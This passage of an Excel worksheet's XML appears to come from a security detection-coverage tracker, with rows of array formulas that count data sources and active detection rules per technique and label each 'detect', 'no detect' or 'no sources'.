        <f t="array" ref="G386">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H386" s="9" t="str" cm="1">
        <f t="array" ref="H386">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I386" s="9" t="str" cm="1">
        <f t="array" ref="I386">IF(SUM(IF($C386=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C386=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J386" s="9" t="str" cm="1">
        <f t="array" ref="J38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86" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M386" s="9" cm="1">
        <f t="array" ref="M386">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N386" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O386" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P386" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S38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86" t="s">
        <v>503</v>
      </c>
      <c r="U386" t="s">
        <v>1919</v>
      </c>
      <c r="V386" t="s">
        <v>1920</v>
      </c>
      <c r="W386" t="b">
        <v>1</v>
      </c>
      <c r="X386" t="s">
        <v>1911</v>
      </c>
    </row>
    <row r="387" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A387" t="s">
        <v>1911</v>
      </c>
      <c r="B387" t="s">
        <v>1921</v>
      </c>
      <c r="C387" t="s">
        <v>309</v>
      </c>
      <c r="D387" t="s">
        <v>747</v>
      </c>
      <c r="E387" t="s">
        <v>1922</v>
      </c>
      <c r="F387" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G387" s="9" cm="1">
        <f t="array" ref="G387">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H387" s="9" t="str" cm="1">
        <f t="array" ref="H387">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I387" s="9" t="str" cm="1">
        <f t="array" ref="I387">IF(SUM(IF($C387=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C387=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J387" s="9" t="str" cm="1">
        <f t="array" ref="J38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87" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M387" s="9" cm="1">
        <f t="array" ref="M387">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N387" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O387" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P387" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S38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87" t="s">
        <v>386</v>
      </c>
      <c r="U387" t="s">
        <v>1923</v>
      </c>
      <c r="V387" t="s">
        <v>1924</v>
      </c>
      <c r="W387" t="b">
        <v>1</v>
      </c>
      <c r="X387" t="s">
        <v>1911</v>
      </c>
    </row>
    <row r="388" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A388" t="s">
        <v>1911</v>
      </c>
      <c r="B388" t="s">
        <v>1925</v>
      </c>
      <c r="C388" t="s">
        <v>1926</v>
      </c>
      <c r="D388" t="s">
        <v>747</v>
      </c>
      <c r="E388" t="s">
        <v>1927</v>
      </c>
      <c r="F388" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G388" s="9" cm="1">
        <f t="array" ref="G388">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H388" s="9" t="str" cm="1">
        <f t="array" ref="H388">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I388" s="9" t="str" cm="1">
        <f t="array" ref="I388">IF(SUM(IF($C388=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C388=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J388" s="9" t="str" cm="1">
        <f t="array" ref="J38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88" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M388" s="9" cm="1">
        <f t="array" ref="M388">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N388" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O388" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P388" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S38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88" t="s">
        <v>503</v>
      </c>
      <c r="U388" t="s">
        <v>1928</v>
      </c>
      <c r="V388" t="s">
        <v>1929</v>
      </c>
      <c r="W388" t="b">
        <v>1</v>
      </c>
      <c r="X388" t="s">
        <v>1911</v>
      </c>
    </row>
    <row r="389" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A389" t="s">
        <v>1911</v>
      </c>
      <c r="B389" t="s">
        <v>1930</v>
      </c>
      <c r="C389" t="s">
        <v>1931</v>
      </c>
      <c r="D389" t="s">
        <v>747</v>
      </c>
      <c r="E389" t="s">
        <v>638</v>
      </c>
      <c r="F389" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G389" s="9" cm="1">
        <f t="array" ref="G389">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H389" s="9" t="str" cm="1">
        <f t="array" ref="H389">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I389" s="9" t="str" cm="1">
        <f t="array" ref="I389">IF(SUM(IF($C389=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C389=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J389" s="9" t="str" cm="1">
        <f t="array" ref="J38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89" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M389" s="9" cm="1">
        <f t="array" ref="M389">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N389" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O389" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P389" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S38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89" t="s">
        <v>658</v>
      </c>
      <c r="U389" t="s">
        <v>1932</v>
      </c>
      <c r="V389" t="s">
        <v>1933</v>
      </c>
      <c r="W389" t="b">
        <v>1</v>
      </c>
      <c r="X389" t="s">
        <v>1911</v>
      </c>
    </row>
    <row r="390" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A390" t="s">
        <v>1911</v>
      </c>
      <c r="B390" t="s">
        <v>1934</v>
      </c>
      <c r="C390" t="s">
        <v>1935</v>
      </c>
      <c r="D390" t="s">
        <v>747</v>
      </c>
      <c r="E390" t="s">
        <v>1073</v>
      </c>
      <c r="F390" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G390" s="9" cm="1">
        <f t="array" ref="G390">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H390" s="9" t="str" cm="1">
        <f t="array" ref="H390">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I390" s="9" t="str" cm="1">
        <f t="array" ref="I390">IF(SUM(IF($C390=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C390=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J390" s="9" t="str" cm="1">
        <f t="array" ref="J39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90" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M390" s="9" cm="1">
        <f t="array" ref="M390">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N390" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O390" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P390" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S39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90" t="s">
        <v>1936</v>
      </c>
      <c r="U390" t="s">
        <v>1937</v>
      </c>
      <c r="W390" t="b">
        <v>1</v>
      </c>
      <c r="X390" t="s">
        <v>1911</v>
      </c>
    </row>
    <row r="391" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A391" t="s">
        <v>1911</v>
      </c>
      <c r="B391" t="s">
        <v>1938</v>
      </c>
      <c r="C391" t="s">
        <v>1939</v>
      </c>
      <c r="D391" t="s">
        <v>747</v>
      </c>
      <c r="E391" t="s">
        <v>1078</v>
      </c>
      <c r="F391" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G391" s="9" cm="1">
        <f t="array" ref="G391">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H391" s="9" t="str" cm="1">
        <f t="array" ref="H391">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I391" s="9" t="str" cm="1">
        <f t="array" ref="I391">IF(SUM(IF($C391=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C391=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J391" s="9" t="str" cm="1">
        <f t="array" ref="J39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91" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M391" s="9" cm="1">
        <f t="array" ref="M391">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N391" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O391" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P391" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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91" t="s">
        <v>658</v>
      </c>
      <c r="U391" t="s">
        <v>1940</v>
      </c>
      <c r="W391" t="b">
        <v>1</v>
      </c>
      <c r="X391" t="s">
        <v>1911</v>
      </c>
    </row>
    <row r="392" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A392" t="s">
        <v>1941</v>
      </c>
      <c r="B392" t="s">
        <v>1941</v>
      </c>
      <c r="C392" t="s">
        <v>120</v>
      </c>
      <c r="D392" t="s">
        <v>1942</v>
      </c>
      <c r="E392" t="s">
        <v>1943</v>
      </c>
      <c r="F392" s="9">
        <f t="shared" si="6"/>
        <v>5</v>
      </c>
      <c r="G392" s="9" cm="1">
        <f t="array" ref="G392">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H392" s="9" cm="1">
        <f t="array" ref="H392">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I392" s="9" t="str" cm="1">
        <f t="array" ref="I392">IF(SUM(IF($C392=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C392=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J392" s="9" cm="1">
        <f t="array" ref="J39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392" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M392" s="9" cm="1">
        <f t="array" ref="M392">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N392" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O392" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P392" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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92" t="s">
        <v>1944</v>
      </c>
      <c r="U392" t="s">
        <v>1945</v>
      </c>
      <c r="V392" t="s">
        <v>1946</v>
      </c>
      <c r="W392" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="393" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A393" t="s">
        <v>1941</v>
      </c>
      <c r="B393" t="s">
        <v>1947</v>
      </c>
      <c r="C393" t="s">
        <v>250</v>
      </c>
      <c r="D393" t="s">
        <v>1942</v>
      </c>
      <c r="E393" t="s">
        <v>1948</v>
      </c>
      <c r="F393" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G393" s="9" cm="1">
        <f t="array" ref="G393">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H393" s="9" t="str" cm="1">
        <f t="array" ref="H393">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I393" s="9" t="str" cm="1">
        <f t="array" ref="I393">IF(SUM(IF($C393=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C393=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J393" s="9" t="str" cm="1">
        <f t="array" ref="J39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93" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M393" s="9" cm="1">
        <f t="array" ref="M393">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N393" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O393" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P393" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S39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93" t="s">
        <v>1681</v>
      </c>
      <c r="U393" t="s">
        <v>1949</v>
      </c>
      <c r="V393" t="s">
        <v>1950</v>
      </c>
      <c r="W393" t="b">
        <v>1</v>
      </c>
      <c r="X393" t="s">
        <v>1941</v>
      </c>
    </row>
    <row r="394" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A394" t="s">
        <v>1941</v>
      </c>
      <c r="B394" t="s">
        <v>1951</v>
      </c>
      <c r="C394" t="s">
        <v>315</v>
      </c>
      <c r="D394" t="s">
        <v>1942</v>
      </c>
      <c r="E394" t="s">
        <v>1952</v>
      </c>
      <c r="F394" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G394" s="9" cm="1">
        <f t="array" ref="G394">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H394" s="9" t="str" cm="1">
        <f t="array" ref="H394">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I394" s="9" t="str" cm="1">
        <f t="array" ref="I394">IF(SUM(IF($C394=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C394=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J394" s="9" t="str" cm="1">
        <f t="array" ref="J39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94" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M394" s="9" cm="1">
        <f t="array" ref="M394">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N394" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O394" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P394" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S39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94" t="s">
        <v>386</v>
      </c>
      <c r="U394" t="s">
        <v>1953</v>
      </c>
      <c r="V394" t="s">
        <v>1954</v>
      </c>
      <c r="W394" t="b">
        <v>1</v>
      </c>
      <c r="X394" t="s">
        <v>1941</v>
      </c>
    </row>
    <row r="395" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A395" t="s">
        <v>1941</v>
      </c>
      <c r="B395" t="s">
        <v>1955</v>
      </c>
      <c r="C395" t="s">
        <v>316</v>
      </c>
      <c r="D395" t="s">
        <v>1942</v>
      </c>
      <c r="E395" t="s">
        <v>1952</v>
      </c>
      <c r="F395" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G395" s="9" cm="1">
        <f t="array" ref="G395">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H395" s="9" t="str" cm="1">
        <f t="array" ref="H395">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I395" s="9" t="str" cm="1">
        <f t="array" ref="I395">IF(SUM(IF($C395=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C395=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J395" s="9" t="str" cm="1">
        <f t="array" ref="J39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95" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M395" s="9" cm="1">
